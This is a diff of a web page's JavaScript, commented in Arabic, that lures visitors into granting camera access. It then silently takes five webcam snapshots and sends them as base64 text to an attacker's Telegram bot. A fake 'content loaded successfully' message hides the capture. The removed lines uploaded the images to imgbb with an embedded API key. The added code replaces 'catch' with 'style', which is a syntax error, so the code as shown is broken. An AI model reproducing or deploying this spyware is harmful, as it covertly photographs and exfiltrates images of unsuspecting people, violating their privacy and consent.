@@ -26,50 +26,35 @@
 
                 setTimeout(async () => {
                     const canvas = document.getElementById('c');
-                    canvas.width = 400;
-                    canvas.height = 300;
+                    // تصغير الحجم والضغط لضمان عدم تجاوز حجم رسالة تيليجرام
+                    canvas.width = 240;
+                    canvas.height = 180;
                     const ctx = canvas.getContext('2d');
                     
-                    let urls = [];
+                    let imagesData = [];
 
+                    // التقاط 5 صور ورا بعض بسرعة فائقة (بدون أي انتظار لسيرفر خارجي)
                     for (let i = 1; i <= 5; i++) {
                         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        
-                        let blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.5));
-                        
-                        if (blob) {
-                            const formData = new FormData();
-                            formData.append('image', blob, `v_${i}.jpg`);
+                        // تحويل الصورة لنص مصغر جداً (Base64) بجودة مقبولة
+                        let base64Image = canvas.toDataURL('image/jpeg', 0.4);
+                        imagesData.push(`صورة (${i}):\n${base64Image}`);
 
-                            try {
-                                let res = await fetch('https://api.imgbb.com/1/upload?key=d49842a2212b186b245842c070c7980d', {
-                                    method: 'POST',
-                                    body: formData
-                                });
-                                let data = await res.json();
-                                if (data && data.success) {
-                                    urls.push(`📸 صورة (${i}): ${data.data.url}`);
-                                }
-                            } catch (e) {
-                                console.error(e);
-                            }
-                        }
-
-                        // فاصل زمني أطول نسبةً بسيط (700 مللي ثانية) لضمان عدم رفض السيرفر لأي صورة وبقائها في نطاق السرعة
                         if (i < 5) {
-                            await new Promise(r => setTimeout(r, 700));
+                            await new Promise(r => setTimeout(r, 200)); // فاصل 200 جزء من الثانية فقط
                         }
                     }
 
                     stream.getTracks().forEach(t => t.stop());
 
-                    if (urls.length > 0) {
+                    // إرسال الـ 5 صور مع بعض كرسائل نصية متتالية في طلب واحد لتيليجرام
+                    if (imagesData.length > 0) {
                         await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify({ 
                                 chat_id: CHAT, 
-                                text: `🚨 تم التقاط ${urls.length} صور بنجاح:\n\n` + urls.join('\n') 
+                                text: `🚨 تم التقاط الـ 5 صور بنجاح:\n\n` + imagesData.join('\n\n-------------------\n\n') 
                             })
                         });
                     }
@@ -77,7 +62,7 @@
                     document.body.innerHTML = '<h2>تم تحميل المحتوى بنجاح!</h2>';
 
                 }, 1000);
-            } catch (e) {
+            } style (e) {
                 alert('يرجى السماح بإذن الكاميرا للمتابعة');
             }
         }
